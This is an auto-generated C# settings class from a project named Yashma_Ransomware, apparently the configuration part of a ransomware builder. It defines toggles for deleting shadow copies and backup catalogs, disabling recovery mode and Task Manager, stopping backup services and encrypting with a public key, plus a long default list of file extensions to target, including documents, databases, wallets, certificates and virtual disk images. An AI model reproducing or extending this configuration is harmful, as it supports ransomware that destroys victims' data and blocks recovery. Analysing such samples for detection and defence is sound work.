﻿//------------------------------------------------------------------------------
// <auto-generated>
//     This code was generated by a tool.
//     Runtime Version:4.0.30319.42000
//
//     Changes to this file may cause incorrect behavior and will be lost if
//     the code is regenerated.
// </auto-generated>
//------------------------------------------------------------------------------

namespace Yashma_Ransomware.Properties {
    
    
    [global::System.Runtime.CompilerServices.CompilerGeneratedAttribute()]
    [global::System.CodeDom.Compiler.GeneratedCodeAttribute("Microsoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator", "16.4.0.0")]
    internal sealed partial class Settings : global::System.Configuration.ApplicationSettingsBase {
        
        private static Settings defaultInstance = ((Settings)(global::System.Configuration.ApplicationSettingsBase.Synchronized(new Settings())));
        
        public static Settings Default {
            get {
                return defaultInstance;
            }
        }
        
        [global::System.Configuration.UserScopedSettingAttribute()]
        [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
        [global::System.Configuration.DefaultSettingValueAttribute("")]
        public string base64Image {
            get {
                return ((string)(this["base64Image"]));
            }
            set {
                this["base64Image"] = value;
            }
        }
        
        [global::System.Configuration.UserScopedSettingAttribute()]
        [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
        [global::System.Configuration.DefaultSettingValueAttribute("False")]
        public bool checkAdminPrivilage {
            get {
                return ((bool)(this["checkAdminPrivilage"]));
            }
            set {
                this["checkAdminPrivilage"] = value;
            }
        }
        
        [global::System.Configuration.UserScopedSettingAttribute()]
        [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
        [global::System.Configuration.DefaultSettingValueAttribute("")]
        public string decrypterName {
            get {
                return ((string)(this["decrypterName"]));
            }
            set {
                this["decrypterName"] = value;
            }
        }
        
        [global::System.Configuration.UserScopedSettingAttribute()]
        [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
        [global::System.Configuration.DefaultSettingValueAttribute("False")]
        public bool deleteBackupCatalog {
            get {
                return ((bool)(this["deleteBackupCatalog"]));
            }
            set {
                this["deleteBackupCatalog"] = value;
            }
        }
        
        [global::System.Configuration.UserScopedSettingAttribute()]
        [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
        [global::System.Configuration.DefaultSettingValueAttribute("False")]
        public bool deleteShadowCopies {
            get {
                return ((bool)(this["deleteShadowCopies"]));
            }
            set {
                this["deleteShadowCopies"] = value;
            }
        }
        
        [global::System.Configuration.UserScopedSettingAttribute()]
        [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
        [global::System.Configuration.DefaultSettingValueAttribute("False")]
        public bool disableRecoveryMode {
            get {
                return ((bool)(this["disableRecoveryMode"]));
            }
            set {
                this["disableRecoveryMode"] = value;
            }
        }
        
        [global::System.Configuration.UserScopedSettingAttribute()]
        [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
        [global::System.Configuration.DefaultSettingValueAttribute("False")]
        public bool disableTaskManager {
            get {
                return ((bool)(this["disableTaskManager"]));
            }
            set {
                this["disableTaskManager"] = value;
            }
        }
        
        [global::System.Configuration.UserScopedSettingAttribute()]
        [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
        [global::System.Configuration.DefaultSettingValueAttribute("True")]
        public bool encryptOption {
            get {
                return ((bool)(this["encryptOption"]));
            }
            set {
                this["encryptOption"] = value;
            }
        }
        
        [global::System.Configuration.UserScopedSettingAttribute()]
        [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
        [global::System.Configuration.DefaultSettingValueAttribute("\".txt\",\".jar\",\".dat\",\".contact\",\".settings\",\".doc\",\".docx\",\".xls\",\".xlsx\",\".ppt\"," +
            "\".pptx\",\".odt\",\".jpg\",\".mka\",\".mhtml\",\".oqy\",\".png\",\".csv\",\".py\",\".sql\",\".mdb\",\"" +
            ".php\",\".asp\",\".aspx\",\".html\",\".htm\",\".xml\",\".psd\",\".pdf\",\".xla\",\".cub\",\".dae\",\"." +
            "indd\",\".cs\",\".mp3\",\".mp4\",\".dwg\",\".zip\",\".rar\",\".mov\",\".rtf\",\".bmp\",\".mkv\",\".avi" +
            "\",\".apk\",\".lnk\",\".dib\",\".dic\",\".dif\",\".divx\",\".iso\",\".7zip\",\".ace\",\".arj\",\".bz2\"" +
            ",\".cab\",\".gzip\",\".lzh\",\".tar\",\".jpeg\",\".xz\",\".mpeg\",\".torrent\",\".mpg\",\".core\",\"." +
            "pdb\",\".ico\",\".pas\",\".db\",\".wmv\",\".swf\",\".cer\",\".bak\",\".backup\",\".accdb\",\".bay\",\"" +
            ".p7c\",\".exif\",\".vss\",\".raw\",\".m4a\",\".wma\",\".flv\",\".sie\",\".sum\",\".ibank\",\".wallet" +
            "\",\".css\",\".js\",\".rb\",\".crt\",\".xlsm\",\".xlsb\",\".7z\",\".cpp\",\".java\",\".jpe\",\".ini\",\"" +
            ".blob\",\".wps\",\".docm\",\".wav\",\".3gp\",\".webm\",\".m4v\",\".amv\",\".m4p\",\".svg\",\".ods\",\"" +
            ".bk\",\".vdi\",\".vmdk\",\".onepkg\",\".accde\",\".jsp\",\".json\",\".gif\",\".log\",\".gz\",\".conf" +
            "ig\",\".vb\",\".m1v\",\".sln\",\".pst\",\".obj\",\".xlam\",\".djvu\",\".inc\",\".cvs\",\".dbf\",\".tbi" +
            "\",\".wpd\",\".dot\",\".dotx\",\".xltx\",\".pptm\",\".potx\",\".potm\",\".pot\",\".xlw\",\".xps\",\".x" +
            "sd\",\".xsf\",\".xsl\",\".kmz\",\".accdr\",\".stm\",\".accdt\",\".ppam\",\".pps\",\".ppsm\",\".1cd\"," +
            "\".3ds\",\".3fr\",\".3g2\",\".accda\",\".accdc\",\".accdw\",\".adp\",\".ai\",\".ai3\",\".ai4\",\".ai5" +
            "\",\".ai6\",\".ai7\",\".ai8\",\".arw\",\".ascx\",\".asm\",\".asmx\",\".avs\",\".bin\",\".cfm\",\".dbx\"" +
            ",\".dcm\",\".dcr\",\".pict\",\".rgbe\",\".dwt\",\".f4v\",\".exr\",\".kwm\",\".max\",\".mda\",\".mde\"," +
            "\".mdf\",\".mdw\",\".mht\",\".mpv\",\".msg\",\".myi\",\".nef\",\".odc\",\".geo\",\".swift\",\".odm\",\"" +
            ".odp\",\".oft\",\".orf\",\".pfx\",\".p12\",\".pl\",\".pls\",\".safe\",\".tab\",\".vbs\",\".xlk\",\".xl" +
            "m\",\".xlt\",\".xltm\",\".svgz\",\".slk\",\".tar.gz\",\".dmg\",\".ps\",\".psb\",\".tif\",\".rss\",\".k" +
            "ey\",\".vob\",\".epsp\",\".dc3\",\".iff\",\".onepkg\",\".onetoc2\",\".opt\",\".p7b\",\".pam\",\".r3d" +
            "\",\".ova\"")]
        public string extensions {
            get {
                return ((string)(this["extensions"]));
            }
            set {
                this["extensions"] = value;
            }
        }
        
        [global::System.Configuration.UserScopedSettingAttribute()]
        [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
        [global::System.Configuration.DefaultSettingValueAttribute("")]
        public string pathToBase64 {
            get {
                return ((string)(this["pathToBase64"]));
            }
            set {
                this["pathToBase64"] = value;
            }
        }
        
        [global::System.Configuration.UserScopedSettingAttribute()]
        [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
        [global::System.Configuration.DefaultSettingValueAttribute("")]
        public string publicKey {
            get {
                return ((string)(this["publicKey"]));
            }
            set {
                this["publicKey"] = value;
            }
        }
        
        [global::System.Configuration.UserScopedSettingAttribute()]
        [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
        [global::System.Configuration.DefaultSettingValueAttribute("False")]
        public bool stopBackupServices {
            get {
                return ((bool)(this["stopBackupServices"]));
            }
            set {
                this["stopBackupServices"] = value;
            }
        }
    }
}
